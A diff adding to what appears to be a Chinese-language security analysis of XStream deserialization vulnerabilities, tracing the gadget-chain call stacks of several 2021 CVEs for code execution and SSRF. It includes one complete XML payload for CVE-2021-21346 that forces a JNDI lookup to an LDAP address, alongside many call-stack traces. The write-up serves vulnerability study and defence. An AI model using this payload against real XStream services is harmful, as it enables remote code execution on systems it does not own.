@@ -432,14 +432,152 @@ com.sun.xml.internal.ws.encoding.MIMEPartStreamingDataHandler$StreamingDataSourc
             sun.nio.ch.FileChannelImpl.implCloseChannel()
               sun.plugin2.ipc.unix.DomainSocketNamedPipe.close()
 ```
-另一个代码执行的payload，调用栈基本一致，但在`com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection.get()`这步后反射调用的是JdbcRowSetImpl，后续调用链如下
+另一个代码执行CVE-2021-21344的payload，调用栈基本一致，但在`com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection.get()`这步后反射调用的是JdbcRowSetImpl，后续调用链如下
 ```
 com.sun.rowset.JdbcRowSetImpl.getDatabaseMetaData()
   com.sun.rowset.JdbcRowSetImpl.connect()
     javax.naming.InitialContext.lookup()
 ```
 
+CVE-2021-21347代码执行漏洞则是在compare方法的选择上有了不同，和CVE-2020-26217相结合。区别在于`java.io.SequenceInputStream.nextStream()`方法中有nextElement()和hasMoreElements()两个调用方向，这个CVE选择了和hasMoreElements方向进行构造，最终走到URLClassloader进行类加载。
+```
+javafx.collections.ObservableList$1.compare()
+  com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data.toString()
+    com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data.get()
+      com.sun.xml.internal.bind.v2.util.ByteArrayOutputStreamEx.readFrom()
+        java.io.SequenceInputStream.read()
+          java.io.SequenceInputStream.nextStream()
+            javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator.hasMoreElements()
+              com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator.hasNext()
+                URLClassloader.loadClass()
+```
+CVE-2021-21349SSRF漏洞，和CVE-2021-21347类似，只是在寻找hasNext时，`com.sun.xml.internal.ws.util.ServiceFinder$ServiceNameIterator.hasNext()`，然后`com.sun.xml.internal.ws.util.ServiceFinder.parse()`解析会调用URL类发送请求。CVE-2021-21350代码执行漏洞和
+CVE-2021-21347类似，只是将最终调用的URLClassLoader换成了`com.sun.org.apache.bcel.internal.util.ClassLoader`
 
+
+CVE-2021-21346相对上面这些是条新链，和CVE-2021-21351类似。毕竟是一个作者挖的。先来看CVE-2021-21346
+```
+<sorted-set>
+  <javax.naming.ldap.Rdn_-RdnEntry>
+    <type>ysomap</type>
+    <value class='javax.swing.MultiUIDefaults' serialization='custom'>
+      <unserializable-parents/>
+      <hashtable>
+        <default>
+          <loadFactor>0.75</loadFactor>
+          <threshold>525</threshold>
+        </default>
+        <int>700</int>
+        <int>0</int>
+      </hashtable>
+      <javax.swing.UIDefaults>
+        <default>
+          <defaultLocale>zh_CN</defaultLocale>
+          <resourceCache/>
+        </default>
+      </javax.swing.UIDefaults>
+      <javax.swing.MultiUIDefaults>
+        <default>
+          <tables>
+            <javax.swing.UIDefaults serialization='custom'>
+              <unserializable-parents/>
+              <hashtable>
+                <default>
+                  <loadFactor>0.75</loadFactor>
+                  <threshold>525</threshold>
+                </default>
+                <int>700</int>
+                <int>1</int>
+                <sun.swing.SwingLazyValue>
+                  <className>javax.naming.InitialContext</className>
+                  <methodName>doLookup</methodName>
+                  <args>
+                    <arg>ldap://localhost:1099/CallRemoteMethod</arg>
+                  </args>
+                </sun.swing.SwingLazyValue>
+              </hashtable>
+              <javax.swing.UIDefaults>
+                <default>
+                  <defaultLocale reference='../../../../../../../javax.swing.UIDefaults/default/defaultLocale'/>
+                  <resourceCache/>
+                </default>
+              </javax.swing.UIDefaults>
+            </javax.swing.UIDefaults>
+          </tables>
+        </default>
+      </javax.swing.MultiUIDefaults>
+    </value>
+  </javax.naming.ldap.Rdn_-RdnEntry>
+  <javax.naming.ldap.Rdn_-RdnEntry>
+    <type>ysomap</type>
+    <value class='com.sun.org.apache.xpath.internal.objects.XString'>
+      <m__obj class='string'>test</m__obj>
+    </value>
+  </javax.naming.ldap.Rdn_-RdnEntry>
+</sorted-set>
+```
+调用栈如下，和CVE-2013-7285一样，以sorted-set作为起始标签，由`TreeSetConverter.unmarshal()`进行解析,但是`TreeMap.put()`之后发生变化
+```
+TreeSetConverter.unmarshal()
+  TreeMapConverter.populateTreeMap()
+    TreeMap.putAll()
+      AbstractMap.putAll()
+        TreeMap.put()
+          javax.naming.ldap.Rdn$RdnEntry.compareTo()
+            com.sun.org.apache.xpath.internal.objects.XString.equals()
+              javax.swing.MultiUIDefaults.toString()
+                javax.swing.MultiUIDefaults.get()
+                  javax.swing.UIDefaults.get()
+                    javax.swing.UIDefaults.getFromHashtable()
+                      sun.swing.SwingLazyValue.createValue()
+                        javax.naming.InitialContext.doLookup()
+                          javax.naming.InitialContext.lookup()
+```
+CVE-2021-39146和上述调用链非常类似，只是在`javax.swing.UIDefaults.getFromHashtable()`后调用方向不同
+```
+javax.swing.UIDefaults$ProxyLazyValue.createValue()
+  javax.swing.UIDefaults$ProxyLazyValue$1.run()
+    javax.naming.InitialContext.doLookup()
+```
+CVE-2021-21351同样是调用`InitialContext.lookup()`，但是是从`JdbcRowSetImpl.connect()`执行到的。调用链的上半部分则是在`com.sun.org.apache.xpath.internal.objects.XString.equals()`后调用了不同的toString()。CVE-2021-21351调用链如下
+```
+com.sun.org.apache.xpath.internal.objects.XObject.toString()
+  com.sun.org.apache.xpath.internal.objects.XRTreeFrag.str()
+    com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM.getStringValue()
+      com.sun.org.apache.xml.internal.dtm.ref.DTMDefaultBase._firstch()
+        com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM.nextNode()
+          com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces.deliverMoreNodes()
+            com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces.parseSome()
+              com.sun.rowset.JdbcRowSetImpl.connect()
+```
+CVE-2021-39148同样是`com.sun.org.apache.xpath.internal.objects.XString.equals()`后调用了不同的toString()
+```
+com.sun.xml.internal.ws.api.message.Packet.toString()
+  com.sun.xml.internal.ws.api.message.MessageWrapper.copy()
+    com.sun.xml.internal.ws.message.saaj.SAAJMessage.copy()
+      com.sun.xml.internal.ws.message.saaj.SAAJMessage.getAttachments()
+        com.sun.xml.internal.messaging.saaj.soap.MessageImpl.getAttachments()
+          com.sun.xml.internal.messaging.saaj.soap.MessageImpl.initializeAllAttachments()
+            com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimeMultipart.getCount()
+              com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart.parse()
+                com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart.parseAll()
+                  com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage.getAttachments()
+                    com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage.parseAll()
+                      com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage.makeProgress()
+                        com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator.hasNext()
+                          com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator.findNextCert()
+                            com.sun.jndi.toolkit.dir.ContextEnumerator.nextElement()
+                              com.sun.jndi.toolkit.dir.ContextEnumerator.next()
+                                com.sun.jndi.toolkit.dir.ContextEnumerator.getNextDescendant()
+                                  com.sun.jndi.toolkit.dir.ContextEnumerator.prepNextChild()
+                                    com.sun.jndi.toolkit.dir.ContextEnumerator.newEnumerator()
+                                      com.sun.jndi.toolkit.dir.ContextEnumerator.getImmediateChildren()
+                                        com.sun.jndi.ldap.LdapReferralContext.listBindings()
+                                          javax.naming.spi.ContinuationContext.listBindings()
+                                            javax.naming.spi.ContinuationContext.getTargetContext()
+                                              javax.naming.spi.NamingManager.getContext()
+                                                javax.naming.spi.NamingManager.getObjectInstance()
+```
 
 
 ### CVE-2021-39144
@@ -498,4 +636,17 @@ AbstractReflectionConverter.unmarshal()
               sun.tracing.ProviderSkeleton.triggerProbe()
                 sun.tracing.dtrace.DTraceProbe.uncheckedTrigger()
                   ProcessBuilder.start()
+```
+CVE-2021-39141与之类似，但是在`com.sun.proxy.$Proxy0.compareTo()`之后调用了不同的invoke
+```
+com.sun.xml.internal.ws.client.sei.SEIStub.invoke()
+  com.sun.xml.internal.ws.client.sei.SyncMethodHandler.invoke()
+    com.sun.xml.internal.ws.db.DatabindingImpl.serializeRequest()
+      com.sun.xml.internal.ws.client.sei.StubHandler.createRequestPacket()
+        com.sun.xml.internal.ws.client.sei.BodyBuilder$JAXB.createMessage()
+          com.sun.xml.internal.ws.client.sei.BodyBuilder$DocLit.build()
+            com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor$2.set()
+              com.sun.xml.internal.ws.spi.db.MethodSetter.set()
+                com.sun.xml.internal.ws.spi.db.MethodSetter$1.run()
+                  javax.naming.InitialContext.doLookup()
 ```
